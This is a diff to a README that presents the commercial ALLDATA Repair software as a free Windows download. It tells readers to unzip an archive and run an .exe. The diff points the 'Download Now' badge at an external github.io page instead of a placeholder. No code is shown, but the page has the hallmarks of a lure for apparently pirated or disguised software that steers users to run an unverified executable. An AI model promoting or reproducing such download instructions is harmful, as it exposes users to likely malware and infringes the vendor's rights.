@@ -9,7 +9,7 @@ With its continuously updated database, ALLDATA Repair ensures accurate, manufac
 Unzip the archive to a separate folder and run the `.exe` file.
 The application will automatically set up the local database and connect to online resources when available.
 
-[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://alldata-repair.github.io/.github/)
 
 ## 📸 Overview
 ![Overview Screenshot 1](https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTT0nGwJm16vHlU4lAyhaTjF8yjw0WjsXtc3Q&s)
